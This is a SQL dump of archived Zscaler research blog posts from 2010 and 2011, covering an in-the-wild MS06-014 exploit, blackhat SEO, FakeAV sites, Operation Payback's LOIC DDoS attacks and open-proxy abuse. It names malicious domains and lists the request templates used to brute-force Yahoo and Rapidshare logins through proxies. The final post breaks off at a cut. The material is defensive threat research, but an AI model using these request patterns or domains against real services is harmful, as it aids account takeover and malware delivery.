view both primary and secondary relationships, similar to what is displayed in the above graph, or a more concise view with just the primary relationships:      Zeus/SpyEye and other bots are often configured to use an IP lookup service (a possible example above) and provide their resolvable IP to the C&C. These types of inter-related transactions can become apparent when correlating botnet web transactions.    I found TheBrain to have a very easy format for converting and importing data to, and to have a very user-friendly, interactive, and fun! interface for working with your imported data. TheBrain includes the ability to \"forget\" and \"remember\" thoughts - i.e., the ability to remove and restore thoughts/links, so while you are conducting your analysis you can clear your brain of any data that is in the way.    What I did find TheBrain woefully inadequate for is large data-sets. When I exported all of the data that I wanted to review for a day, the XML file was 1.66GB for all of the Thoughts and Links. When I tried to import into PersonalBrain on my MacBook Pro (4GB, 2.53GHz Core 2 Duo) I ended up letting it attempt the import overnight ... after about 20 hours of waiting for it to import the data I \"force quit\" the application (though it never said \"not responding\").    If your data-set is of relatively small size, TheBrain may be a good free tool to add to your arsenal. Feel free to share other good, interactive, free visualization tools for analyzing web transaction logs, particularly if they scale to larger data-sets.', 'Analysis', 'https://www.zscaler.com/blogs/research/using-thebrain-visualize-web-transaction-logs');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (437, 'Exploit In The Wild For MS06-014 – A Five Year Old Vulnerability', 'ThreatLabz', 'January 20, 2011', 'Although 0day vulnerabilities receive all the attention, it’s not unusual to see attackers still taking advantage of old vulnerabilities to attack end users. Here\'s such an example where the vulnerability used was MS06-014 – a five year old vulnerability!. hxxp://www.win0day.com/win/6.htm delivers an obfuscated JavaScript exploit for this attack. More information about this vulnerability can be found here. Back in 2006 Metasploit released exploit code for this vulnerability.    Lets look at obfuscated JavaScript used:          The de-obfuscated code looks like this:    The exploit takes advantage of vulnerable ActiveX object “RDS.DataControl” having classid “BD96C556-65A3-11D0-983A-00C04FC29E36”. The exploit is designed to download executable files, which are then stored on victim\'s machine. This executable file path in the exploit is as follows:    This in turn decodes to:    Virustotal results indicate that 21/43 AV engines have protection against this Trojan – a concerning statistic considering the age of the exploit used to deploy the malware. Virustotal’s URL submission indicates that malware URL was submitted on 2010-11-18 and still is in active state. Why would attackers continue to leverage such an old vulnerability? Sadly, as we have shown in our quarterly reports, nearly one in five corporate users still employ Internet Explorer 6, a nine year old web browser.    Pradeep', 'Exploit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/exploit-wild-ms06-014-five-year-old-vulnerability');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (438, 'Blackhat SEO Numbers For December 2010 (Part II)', 'Julien Sobrier', 'January 20, 2011', 'This is a follow up to the numbers I presented in Part I, which discussed malicious spam pages in Google results and the malicious that sites they redirect to.Google warningsThe number of spam pages which are flagged by Google represent only about 44% of all spam identified by Zscaler. If we look at spam pages redirecting to a malware, 57% are flagged. These numbers are about the same as what we saw in March 2010 (53% flagged).52% of the malicious spam links are flagged by GoogleDistributions of spam links per pageSpammers are still able to elevate their links to the first page of search results. However, compared to March 2010, there are fewer spam links on the first page than there used to be.Number of spam links on each result page in GoogleIn general, more search terms contain Blackhat SEO spam links, but there are fewer such links per search, when compared to March 2010.Number of spam links per poisoned searchOverall, Google\'s Blackhat spam SEO situation has improved: there are fewer spam links on the first page and fewer search terms had more than 50% of links returned as malicious. However, Google still struggles to clean their index, or at least to warn users about real threats.-- Julien', 'Phishing', 'https://www.zscaler.com/blogs/research/blackhat-seo-numbers-december-2010-part-ii');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (439, 'High Profile Websites Hijacked To Lead To Fake Stores', 'Julien Sobrier', 'January 12, 2011', 'Recently, a lot of high profile .EDU and .GOV were hijacked to redirect users to fake online stores. Google searches related to buying software (\"buy windows 7 key\", where to buy microsoft, \"purchase microsoft word\", \"buy microsoft office\", etc.) contain a long list of websites running on non-standard ports: www.kidsforkidsfestival.org:8080, en.jurispedia.org:4444, >www.notiuno.com:4577, etc. These links redirect users to online stores which claim to sell software at a discounted price.Spam results for buying WindowsMajor websites hijackedThe list of hijacked sites include:Harvard (Alexa rank in US: 875, cxc.harvard.edu)MIT (Alexa rank in US: 963, petar.blog.lcs.mit.edu, fig.scripts.mit.edu, hlt.media.mit.edu)Stanford (rank 782, mentalhealth.stanford.edu, yuba.stanford.edu, assu.stanford.edu)Fandango (rank 236, www.summermovies.fandango.com)There are also governmental sites in the list, from US, China and other countries:openworld.govpaceflorida.gov fpa.tas.gov.au ezhouinvest.gov.cn perak.gov.mymisiones.gov.aretc.Fake storesThe fake stores use multiple domain names, and each site looks slightly different: softsupreme.com, softsupreme.net, buysupreme.net, software-supreme.com, softbuy-download.net, softbuy-download.com, sacon.org, topoemdownloads.net, etc. I\'ve seen more than 75 different domains so far.Fake storeMultiple languages and other spamsUnlike the usual Blackhat spam SEO coming from the Google Hot Trends, this type of spam is targeted at multiple languages: English, French (\"achat windows\"), German (\"Microsoft kaufen\"), etc.Hijacked sites on non-standard ports are also used for other types of spam: US student visa, Viagra, etc.Once again spammers have managed to poison search results for popular searches. This specific spam was reported a month ago, but it still shows up in the first page of results for multiple searches.-- Julien', 'Abuse;Phishing', 'https://www.zscaler.com/blogs/research/high-profile-websites-hijacked-lead-fake-stores');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (440, 'Alexa Illustrates Web Security Risks (part 1)', 'ThreatLabz', 'January 11, 2011', 'I recently needed to look at some Alexa data related to their tracking of the top web domains visited for a side project that I was working on.During my investigation of their data, I found it interesting to see a number of suspicious / malicious domains included in their daily top 1M list.In this first blog section, I want to show that FakeAV / scareware malware has infiltrated the top websites according to Alexa.  To begin with, there are 150 domains in the top list that contain the string \"virus.\"  This illustrates the popularity and the potential profitability of  distributing software that cleans (or claims to clean) infected systems.It could be inferred then, that there are a lot of systems on the Internet that users are trying to clean and/or protect from infection.  Unfortunately, looking at the domains / sites in the list, it is difficult to determine if the wares being peddled on the site are legitimate or malicious.  From my experience, most legit A/V products don\'t include the word \"virus\" within their domain name.  The volume and sometimes \"pushy\" nature of anti-virus related sites further adds to the confusion of what are real or fake / malicious.  Many of these sites appear to be affiliate sites (whether authorized or not), but there are malicious sites sprinkled in the results as well...For example, a top scareware site in Alexa is hxxp://antivirus-defender.ru/.  This site shows the typical scareware scanning screen (in Russian):But with one twist- after the fake scanning is completed to scare the victim to purchase / download / install the wares, they are presented with a screen to enter a code that they purchase over SMS in order to download:This translates to English as:Unlike other scareware campaigns where the install is allowed first, and then pop-ups and warnings entice the victim to pay- this campaign preempts payment before installation and payment is done over SMS, which is a bit unique.There are a handful of other malicious A/V sites within the Alexa results as well- e.g., antivirus-scanonline.com (is listed in Alexa and Google Safe Browsing) and virus-scanonline.com (a known malware site which is now dead).  Looking up other key strings within Alexa, such as \"scann\", uncovered a few more malicious results: onlinescannerxp.com, best-guardinscanner.in, thebestscan-scanner.com, best-scan-scanner.in, smart-securityscanner.net, etc.FakeAV was just one example of malware within the Alexa list.  Doing SURBL and Google SafeBrowsing lookups of the Alexa domains showed a number of other results.  For example, the domain freefilesoft.net is listed at position number 3378 in Alexa, but is also listed in SURBL.It appears to offer up a Fake Codec that installs Adware.Hotbar software:(hxxp://www.freefilesoft.net/xvid_dl/)In the next section I will analyze the results from my scans of the top 1M sites and identify other threats / drive-by-downloads that are included within the most popular sites according to Alexa.', 'Malware', 'https://www.zscaler.com/blogs/research/alexa-illustrates-web-security-risks-part-1');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (441, 'Blackhat SEO Numbers For December 2010 (Part I)', 'Julien Sobrier', 'January 05, 2011', 'Blackhat spam SEO was very prevalent in 2010 and it is not likely to disappear in 2011. I\'ve compiled a few statistics on Blackhat spam SEO pages found in Google search results during December 2010:           	Number of spam pages:  4,814  	Number of spam domains: 428  	Number of malicious sites: 483      I usually limit my Google scans to the first 10 pages of results, so there are likely many more spam pages in Google\'s full index.    Malicious sites    Fake AV pages are still the most popular type of attack, accounting for 85% of all malicious sites. Next in line are fake software stores, with 6% of the sites. I\'ll give more details about this type of attack in a future blog post.    5% of the malicious sites were unreachable, and could not be classified.                     	  		  			  		  		  			Types of malicious sites: mostly fake AV  		  	                       44% of the malicious sites use a .IN domain name. 25% use a .COM extension, and 16% use an IP address without a domain name. .CC domains represent only 4% of all malicious domains. .CO.CC used to be the most popular TLD for fake AV pages, but it is now .IN                	  		  			  		  		  			Malicious sites by domain extension  		  	             Spam pages    I found 428 legitimate sites hosting 4,814 spam pages in Google search results. That\'s an average of 11 spam links per domain within the top ranks for popular searches.    The spam sites are found all over the world: 31 different TLDs were found amongst spam sites. The international .COM extension was found in 58% of the sites, .ORG in 8% and .NET in 6%. The .EDU TLD represents 10% of the total. HJacked college websites were mostly to lead to fake software stores.                                              	  		  			  		  		  			Spam sites by domain extension  		  	                       Most dangerous searches    356 Google searches contained at least one malicious spam link in December 2010.    The most dangerous searches relate to buying software online, and lead to a fake store. The most dangerous popular search (shown in Google Hot Trends) was for \"sherwood blount\" with 63 spam links amongst the first 100 search results!                               	  		  			  		  		  			Top-10 most dangerous Google searches in December 2010  		  	        I am still compiling the numbers and will do another post on the topic shortly. It looks like malicious Blackhat spam SEO will still be a major threat, if not the most significant threat to users in 2011.    -- Julien', 'Phishing', 'https://www.zscaler.com/blogs/research/blackhat-seo-numbers-december-2010-part-i');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (442, 'Google Search Results Warn About Hijacked Sites', 'Julien Sobrier', 'December 22, 2010', 'Last Friday, Google announced a new warning for hijacked sites displayed within search results. The new warnings say \"This site may be compromised\". Such results represent legitimate sites that have likely been hijacked to host spam which redirect users to another malicious domain    It is another step forward for Google in their battle to combat blackhat spam SEO, but this is not entirely new. Google was already displaying warnings for some of the hijacked sites, but not all of them. \"This site may harm your computer.\", was already previously displayed by Google for certain sites. In fact, several hijacked sites still have this warning. This particular warning appears for all pages within a potentially compromised domain, including hijacked sites, legitimate pages and spam. I don\'t know if Google plans to change these warnings to their new, and more accurate, warning.         	  		  			  		  		  			Hijacked site with old warning  		  	        Google seems to be very hesitant to blacklist entire sites, and I can understand why. However, I hope they will be willing to add more warnings to their search results. This should result in webmasters being aware their website has been hijacked and Google users in turn should will become more aware of the Blackhat spam SEO issue.    Google has not however implemented this new warning correctly. I did a search for one the hijacked site, bizfarm.net. The warning is shown for http://bizfarm.net/ only and not for other compromised pages on the domain.                	  		  			  		  		  			Warning about hijacked site  		  	      The home page does not actually redirect to a malicious page. But the spam pages, which are redirecting users to a fake AV page, do not have any warning in the Google search results. I tried other domains and saw the same type of issues.                     	  		  			  		  		  			No warning from Google about the actual malicious pages  		  	      Overall, very few domains have this new warning. Many hijacked domains continue to display no warning whatsoever. I have also checked  search results for the recent popular search \"mary lou henner\". On December 19th, there were 10 malicious spam pages redirecting to a fake AV page, but only 3 of the results included warnings. These 3 warnings were the old \"This site may harm your computer\". No warnings were displayed, stating that the results may represent hijacked pages.    Finally, my biggest disappointment is that this new warning does not help users as much as it could, even if Google fixes the problems described above. When a user clicks on a link that Google showed as \"may harm your computer\", he is redirected to a warning page. Then the user has to enter the URL manually in the browser address bar to actually go the dangerous page. This means that the Referer header does not show \"google.com\", so in most cases the user will not be redirected to the malicious domain. However, when Google shows the new warning, the search result link points directly to the malicious spam page. The Referer shows that the user is coning from a Google search, and the spam page will redirect the user to a malicious domain.    This new warning has the potential to be a significant step forward in the fight against Blackhat spam SEO. More webmasters and more users will be aware of the issues over time, but first, Google has to display the warnings in the right place, below the actual malicious links, and extend their list of hijacked sites. Hopefully they will consider changing the malicious links as well, so that users have to do more than clicking on a single link to put themselves at risk.', 'Compromise', 'https://www.zscaler.com/blogs/research/google-search-results-warn-about-hijacked-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (443, '2011 Security Predictions', 'Michael Sutton', 'December 21, 2010', 'It’s that time of year again. As I prepare for my annual pilgrimage to the Great White North to visit family, I also turn my attention to the annual tradition of predicting the future. The beauty of the security industry is that it’s never boring. Technologies race forward (often without security) and attackers continue to impress with their ingenuity. 2010 was another fun filled year and 2011 is sure not to disappoint. Enjoy.1.     Political Hacktivism - In the wake of Julian Assange’s arrest, following an already dramatic series of events in the ongoing Wikileaks saga, we gained insight into the power of political hacktivism in the social networked era. Project Payback, the series of Distributed Denial of Service attacks stemming from the movement known as Anonymous, succeeded in temporarily disabling major web sites and did so with limited means and no centralized leadership structure. Anonymous is not a coordinated group, it has no membership list and anyone serving as a spokesperson or leader is likely doing so unilaterally. Project Payback emerged quite literally overnight, encouraged the use of relatively unsophisticated DDoS tools such as Low Orbit Ion Cannon (LOIC) and yet was surprisingly effective. Traditionally, small, well-coordinated groups have been behind efforts related to political hactvism. Now however, we find ourselves in an era where complete strangers can quickly organize, coordinate and attack, and do so with relative anonymity. Welcome to the world of flash mob hactivism. Expect others to be inspired by the attention garnered by Operation Payback and stage similar attacks against corporations or government entities that have received negative press attention.2.     SSL Only Sites - Firesheep opened many eyes to an elephant that has been in the room for many years. While web applications commonly leverage SSL to protect login credentials, most sites shy away from SSL for general traffic once authentication is complete. This is common for a variety of reasons such as performance and complexity, especially when sites tend to be a mashup of content hosted on a variety of different domains. Despite the challenges, Firesheep has forced web application owners to revisit the decision not to make sites SSL only, by brining side jacking to the masses - the ability to capture an authentication cookie and impersonate another user on an open network. With an increasingly mobile workforce accessing web based resources from coffee shops and airports, side jacking attacks are trivial. In 2011, expect a handful of major vendors to finally tackle this challenge head on and deploy SSL only websites.3.     Use and Abuse of the Cloud - In 2010, the Cloud Security Alliance (CSA) released the Top Threats to Cloud Computing. Included on that list of seven threats was the acknowledgement that attackers are drawn to the cloud for the same reasons as legitimate enterprises - low cost access to powerful computing resources. It is not uncommon to see botnet C&C servers or drop zones running on Amazon or Rackspace servers. This may occur due to legitimate hosts being infected or the attackers may purchase the services outright. The on-demand, self service nature of the cloud makes it difficult to prevent abuse up front, leaving cloud vendors to remove abusive accounts once complaints flood the help desk. For attackers that are used to quickly migrating servers as take downs occur, this is hardly a challenge, especially given the ease with which they can quickly spin up dozens of powerful instances at a low price (or free if stolen credit cards are involved). Expect the trend of cloud-hosted botnets to grow.4.     Indirect Data Breaches - 2010 is ending with a series of high profile data breaches including those affecting well known companies such as Gawker Media and McDonald’s (via Silverpop). One thing that we’ve learned from these attacks is that credential theft is not only used to attack the affected domain, but also other sites due to the common practice of sharing the same username/password across numerous sites. Historically, there has been concern that single sign on systems such as Facebook Connect, create an Achilles heel - compromise one database and have access to many. We’re learning that the opposite can be true as well - by forcing people to have multiple logins, they’ll simply repeat one over and over again and their security is then only as strong as the weakest link in that chain - a riskier overall proposition that having one secure authentication source. As media reports of data breaches at popular sites continue, I expect an increasing number of web applications to offer SSO capabilities from well known brands such as Facebook as an option, especially on lesser known sites.5.     Malvertising Goes Offline - Malvertising is a well-known technique, whereby attackers lease advertising space on popular websites in order to facilitate an attack. This may involve targeting a known browser based vulnerability by using the ad to deliver a malicious media file (ie. Flash or images), or it could simply be used to lure unsuspecting users to a secondary, malicious site. To date, malvertising has taken place on websites. However, mobile ad platforms such as iAd (Apple) and AdMob (Google) are emerging as powerful players in an effort to control mobile advertising on tablets and smartphones. Don’t expect attackers to ignore this powerful ability to reach an entirely new set of potential victims. Malvertising could be prevented if advertising networks and host sites better filtered third party content, but history has shown us that often fails to occur.6.     More App Store Abuse - In last year’s security predictions, I spoke about the likelihood that malicious content would make it’s way into mobile app stores. It did take long for that prediction to come true. Now some would argue that even a few malicious apps sneaking past an app store gatekeeper is better than standard process of downloading applications from anywhere on the web where there is little way to know if they’ve ever been scrutinized for security issues. While true, sneaking malicious content into an app store is an attractive prospect for an attacker as they’re able to piggyback on the reputation of the app store host (Apple, Google, RIM, etc.) and potentially infect millions without needing to do anything to generate traffic to the site. In 2011, we’ll see app stores go beyond mobile devices with initiatives such as Google’s Chrome Web Store and Apple’s Mac App Store. Yes, attackers are already salivating at the opportunity to infiltrate another ‘trusted’ app store.7.     Niche Malware - Stuxnet demonstrated that malware can successfully target not just PCs or mobile devices, but any IP connected device, in that particular case, SCADA systems. While, Stuxnet may have had some additional brain power behind the attack, it’s no secret that embedded, Internet connected servers have a spotty security record both due to the lack of scrutiny that they’re subjected to and a generally non-existent patch processes. Earlier this year, I blogged about how embedded web servers have left confidential documents on thousands of HP scanners accessible to anyone with a web browser. Today, anything with a power switch is connected to the Internet. I anticipate the growth of niche malware designed to attack or harvest information from these insecure and often completely unprotected devices.8.     Cloud Shared Technology Breach - Returning to the CSAs Top Threats report, another high risk item making the list relates to vulnerabilities in shared technologies underlying the infrastructure that cloud instances reside upon. For IAAS providers, that includes the hardware, operating system and virtualization technologies. While we move up the stack to include PaaS and SaaS vendors, additional middleware and application components are shared as well. While I don’t necessarily anticipate attacks leveraging a known vulnerability in a COTS component on the infrastructure for a large cloud vendor due to stringent patching practices; I do feel that a high profile breach at a lesser-known vendor, especially one in a custom component of shared technology is quite likely.9.     Social Networking Meets Social Engineering - Attacks on end users virtually always involve social engineering - a user must be convinced to visit a web page, open and attachment, etc. Spam email has valiantly served this purpose for many years, but just as everyday users are migrating away from email and toward social networks such as Facebook and Twitter for communication, so too are hackers. This is far from a bold prediction as attackers have been abusing social networks since they first came online. For example, XSS vulnerabilities on Twitter have been used to push malicious tweets, while likejacking has emerged on Facebook as a means of promoting malicious profiles. While leveraging social networks for evil is not new, I expect 2011 to be the year that social networks become the main communication medium for attackers, not just an alternate channel.10.  Device Agnostic Attacks – As mobile devices continue to gobble up an increasing percentage of bandwidth, attackers will shift to web based, device agnostic attacks. Attacks such as XSS and clickjacking, once seen as academic attacks that were experimented with but not widespread, are now increasingly commonplace. We have witnessed numerous web-based worms, especially on Twitter, thanks to a never-ending battle against XSS vulnerabilities or likejacking - a specific type of clickjacking, targeting Facebook profiles. Why the shift, when there are no shortage of Microsoft vulnerabilities? Whereas the Windows operating system has long dominated the desktop market, the mobile space is an entirely new environment from an attack perspective. Multiple operating systems have significant market share and numerous variants of each exist. As such, operating system vulnerabilities are of less value. Web based attacks however, require nothing more than a Javascript aware web browser – something that every web enabled device from smartphones to television sets now have.See you next year.- michael', 'Data Breach;Hacktivism', 'https://www.zscaler.com/blogs/research/2011-security-predictions');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (444, 'Chinese Phishing Sites: Stocks And Government Lottery', 'Julien Sobrier', 'December 15, 2010', 'I find Chinese phishing sites particularly interesting. For starters, they don\'t seem to attract too many security researchers. I have found that very few Chinese sites are blocked by Phishtank or Google Safe Browsing. Additionally, the type of phshing is very different from what we see in the US or other Western countries. While sites related to banking (PayPal, Bank of America, J.P. Morgan, etc.) are the primary targets of phishers overall, Chinese phishing sites are mainly focused on QQ (Instant messaging, online games, etc.) or Yahoo! Auctions.Recently I found two Chinese phishing/scam sites: a site about stocks from Shanghai Huaer Securities, and a government lottery. These two types of sites use a large number of pages with an IFRAME displaying the main site, and both follow a similar layout. The domain names are registered to different people, so the phishers may not be affiliated.Shanghai Huaer Securities This site claims to be a stock trading company for the Shanghai Securities market.Shanghai Securities trading site.The main sites is hosted on huaerzq.com. The \"Add to Favorite\" links do not use the same domain, rather they leverage short links (http://www.goo.gl/YebPW) which redirect to huaer88997766.now.to, which is simply an IFRAME to huaerzq.com.There are many now.to sub-domains which display this website: soso112233.now.tohuaer88997766.now.tohua123567000.now.tohua88899900.now.togugu99889988.now.togugu001122.now.tolang123123.now.togugu6677.now.to168.hua8899.now.tososo9988.now.togugu8899.now.to33223388.now.toGovernment lotteryThe second type of site claims to be a Government lottery. Proceeds are purported to help the kids you see on the right side. I found two slightly different versions of this site.Fake government lotteryThis site is hosted on these domains:www.330069.com55882.co.cc55571.co.ccAnd the following domains contain an IFRAME to one of the sites above:797.feels3.de 90.ezpagez.comwww.66797.co.cc These sites are not blocked by any popular phishing blacklist that I am aware of, and will therefore likely stay up for some time.-- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/chinese-phishing-sites-stocks-and-government-lottery');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (445, 'Hacktivism On Display: Operation Payback And The Wikilkeaks Saga', 'Michael Sutton', 'December 10, 2010', 'hack\r\nverb \\ˈhak\\\r\na : to write computer programs for enjoyment\r\nb : to gain access to a computer illegally  \r\n\r\n \r\n\r\nac·tiv·ism\r\nnoun \\ˈak-ti-ˌvi-zəm\\\r\na : a doctrine or practice that emphasizes direct vigorous action especially in support of or opposition to one side of a controversial issue\r\n\r\n \r\n\r\nhacktivism - hacking meets activism\r\n\r\n\r\n \r\n\r\nThe Wikileaks saga has come with no shortage of drama and intrigue but it also serves as a remarkable example of hacktivism in the social networking era - when tools to organize and collaborate not only exist but are part of our everyday lives. The latest developments demonstrate just how quickly large, disparate groups can organize and with relatively simple technology do very real damage.\r\n\r\n\r\n\r\n \r\n\r\n\r\nBackground\r\n\r\nFollowing the arrest earlier this week of Julian Assange, the now very public face of Wikileaks, a entity known as Anonymous, has led the charge to encourage DDoS attacks on a variety of websites. Anonymous, which originally emerged from 4chan must be considered an entity as opposed to a group because there is really no concept of membership. Anonymous is simply the banner under which like minded individuals gather in the name of a cause - in this case, to seek retribution for perceived corporate cooperation to cripple Wikileaks, a movement that has come to be known as Operation Payback.\r\n\r\n \r\n\r\nCommunications Infrastructure\r\n\r\nThe group conducting the attacks is open and so are the communication mediums. Coordination has occurred via Twitter, Facebook, the Anonymous website and IRC channels. While various sites have been taken down, new ones emerge to take their place just as quickly. IRC communication has occurred primarily on irc.anonops-irc.com within a variety of channels including #OperationPayback and #Target.\r\n\r\n \r\n\r\nTakedowns are Futile\r\n\r\nVarious sites have been taken down and accounts suspended throughout the wikileaks saga, as corporations are forced to walk the delicate tightrope between free speech and reputational damage. However, in reality such efforts are futile as the modern SaaS/Cloud/Social Internet permits new communication channels to be setup elsewhere almost instantaneously and generally at no cost.\r\n\r\nThe initial Anon_Operation Twitter account was suspended, only to be quickly replaced by others such as Op_Payback and  Anon_SpecOps, which so far remain online. These accounts have served as one of the mechanisms to focus DDoS attacks on specific targets and also share ongoing information about the attacks.\r\n\r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nFacebook also quickly took down a group entitled Operation Payback which supported the effort, only to see dozens more show up in it\'s place.\r\n\r\n\r\nWikileaks itself has setup over 1,000 mirror sites to ensure that individual takedown efforts by ISPs or DNS providers will have a limited effect overall.\r\n \r\n\r\nAttack\r\n\r\nThe DDoS attacks have leveraged a tool known as LOIC (Low Orbit Ion Cannon), a relatively simple tool designed to flood targets with TCP/UDP packets or HTTP headers. Some versions incorporate a \'hive mind\' feature which allows the tool to connect to an IRC channel where the targets can be centrally managed. Throughout the attacks this week, Anonymous has been encouraging anyone willing to participate to use LOIC to flood specific targets. While other tools and attack methods may have been used in the DDoS attacks, LOIC is the one tool that the public at large is being encouraged to adopt. If indeed the successful DDoS attempts have used nothing more than a free Internet fire hose, it is a concerning indicator of overall DDoS defenses at the targeted networks.\r\n\r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nJavascript based versions of LOIC JS have also been preconfigured with attack targets and hosted online. The advantage of this approach is that the tool requires absolutely no security knowledge for someone to participate in the attacks. Rather than needing to compile/install source code, a user simply pulls up LOIC JS in their browser and fires traffic at the target with the click of a button.\r\n\r\n \r\nContributors have even modified versions of LOIC JS for mobile devices to ensure that road warriors can participate in the attacks.\r\n\r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nTargets\r\n\r\nAnonymous has targeted a variety of websites, all of which are perceived to have either caved to government demands to not support Wikileaks or have spoken out against Wikileaks and Julian Assange. \r\n\r\n \r\n\r\nDamage\r\n\r\nDespite the relatively unsophisticated nature of the attacks, they do appear to have been successful in at least temporarily taking sites for Visa, PayPal and Mastercard offline as can be seen in the screenshots below. Reports also indicate that DDoS attacks took down sites for Swiss bank PostFinance, the Swedish Prosecution Authority and Sarah Palin, although an attack on Amazon was unsuccessful.\r\n \r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nNetcraft is maintaining a page to monitor uptime of all sites targeted by Operation Payback.\r\n\r\nLessons Learned\r\n\r\nWhile I certainly don\'t condone the Anonymous attacks, it is important that we learn from them. We have seen various instances of hacktivism throughout the years, such as defacements that occurred following the mid-air collision of a US spy plane and a Chinese fighter jet or Project Chanology, an earlier Anonymous effort targeting the Church of Scientology. However, I have not previously seen a movement quite like the one that we are currently witnessing, one where literally thousands of people have come together so quickly, most with limited or no security knowledge and yet they have been able to do real damage. This has occurred in part to the nature of the story itself. It is one that has garnered a global audience, but it has also occurred because the tools to organize such an effort are now so readily available. From social networking sites to free hosting to ubiquitous broadband, the assets required are within reach of anyone with a web browser.\r\n\r\nWhat should corporations and governments take away from this week\'s events?\r\n \r\n\r\n	Hacktivism is a legitimate threat to corporations and governments\r\n	Efforts by authorities to censor communication among hactivists is futile - it will not achieve the intended goal of halting the attacks and will more likely add fuel to the fire\r\n	While attacks may be relatively unsophisticated from a technical perspective, they can be successful nonetheless\r\n\r\n\r\n\r\nThey got the guns, but we got the numbers\r\nGonna win yeah, we\'re taking over.\r\n\"Five to One\", The Doors\r\n\r\n- michael', 'Data Breach;Hacktivism', 'https://www.zscaler.com/blogs/research/hacktivism-display-operation-payback-and-wikilkeaks-saga');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (446, 'Top Abuses Of Open Web Proxies', 'ThreatLabz', 'December 07, 2010', 'While there is nothing new or Earth-shattering in this post, I thought I\'d share what I have seen as the top abuses of open web proxies - as this is an everyday occurrence involving a large volume of web transactions and is a constant annoyance on the Internet.An \"open proxy\" is...In other-words a server that anyone on the Internet can forward traffic through.  There are various flavors of open proxies:Transparent open proxy - includes originating IP address within the headers or a cookie so the traffic can be traced back to the source (common in a caching proxy setup).Anonymous open proxy - mask/hide the originating IP address of the traffic.  However, there is often a tag from the proxy identifying the proxy version, etc. so that the destination server could identify the traffic as being sent through a proxy.\"Elite\" open proxy - provides no indication to the destination server that the traffic has been forwarded.  These are the most desirable form of proxies in the underground.I\'ve analyzed many thousands of transactions on a few \"elite\" open web proxies, to determine how they are being used (abused).  This is the general breakdown of the percentage of the transactions that I analyzed (there were over a quarter of a million total that I reviewed).#1: Distributed Brute-Forcing:This is the repeated attempt at  trying username / password combinations to gain unauthorized access to  accounts.  Within the abuse of open web proxies, I have seen repeated  abuse of the proxies. For example, proxies are often used to brute-force Yahoo! and Rapidshare  accounts.  As these target sites identify the brute-forcing activity, they block the source IP address from further attempts - so the brute-force attempts are distributed among open proxies to mask and vary the source IP addresses of the attempts.The Yahoo brute-force attempts primarily appear as HTTP GET requests taking a variety of forms:<yahoo>/config/login?login=<username>&passwd=<password><yahoo>/config/pwtoken_get?login=<username>&src=<source>&passwd=<md5_password>&challenge=<challenge_response>&md5=1<yahoo>/client/?.intl=us&.src=knowsrch&.done=http://answers.yahoo.com&login=<username>&passwd=<password><yahoo>/client/clogin?login=<username>&challenge=<challenge>&response=<response>The Rapidshare brute-force attempts appear as HTTP GET requests taking the form:<rapidshare>/cgi-bin/rsapi.cgi?sub=getaccountdetails_v1&type=prem&login=<username>&password=<password><rapidshare>/cgi-bin/premium.cgi&accountid=<id>&password=<password>&premiumlogin=1&logout=&fileid=fileid&fimename=filename&ru=<ru>Note: For both Yahoo and Rapidshare IP addresses and domain names are rotated through.  For example:Log Snippet of Yahoo Brute-Forcing#2: Comment / Forum Spamming:This is the mass-posting of \"comments\" onto blogs, forums, guestbooks, and other sites that allow open interaction with the sites.  These comments include the \"spam advertisement\" variety ranging from porn, pharma, gambling, and pay-per-click affiliates.  The other variety is the SEO variety in which the comments include links back to a page they are trying to increase search engine ranking for.  Some SEO tools like XRumer include this functionality to include automatic registration and CAPTCHA bypass for posting to sites.The comment spam HTTP GETs vary depending on the forum setup, but many followed the formats:<site_page>.php?act=post&do=new_post&f=<forum_id><site_page>.php?do=newthread&f=<forum_id><site_page>.php?mode=post&f=<forum_id>&sid=<session_id><site_page>comment/reply/<story_id>Snippet of logs showing the forum spammingFollowing the spam from one of the forum spammers, shows that they are trying to increase the visibility to World of Warcraft auction sites (e.g., cash for WoW gold).Sample spam message:WoW auction site:#3 Pay-to-click (PTC) \"Cheating\"PTC/PTP/PTR sites are: pay-to-click, pay-to-promote, pay-to read ads / fill out surveys.  These sites are businesses with varying degrees of legitimacy - I doubt the site owners/members pay taxes, in some cases the site owners don\'t pay out their members, and in many cases the members try to \"cheat\" the sites using things like botnets or infected machines.The business model is basic: web site owners and advertisers pay PTC sites to promote their site. In turn, PTC members receive a fraction of a cent for each click they generate to the advertised site.  PTC members also receive commissions for referring new members to sign-up. As such, new members fall into a pyramid hierarchy in which a small percentage of their revenue is given to the referring user.  PTC sites have varying degrees of memberships and also limit the number of times that a member can generate revenue from a participating site.PTC members that try to cheat the system attempt to create as many referred users under them as possible to generate a commission, and from each newly created referrer, automatically click through the participating sites, generating a daily revenue stream something along the following lines:Revenue = ((Commission * Referrer Accounts Created) + (Referrer Accounts Created * Clicks Allowed * Participating Sites * Fraction of a cent payout)) * Number of PTC sites a member ofPTC sites are aware of members attempting to cheat, so they look at things like the source IP of the transactions and identify and ban users when multiple accounts all come from the same IP address.  PTC sites also try to identify if the transactions are being forwarded from a proxy - because of these checks, \"elite\" proxies unknown to the PTC sites are in high demand.Here is an example of a PTC site that I saw being 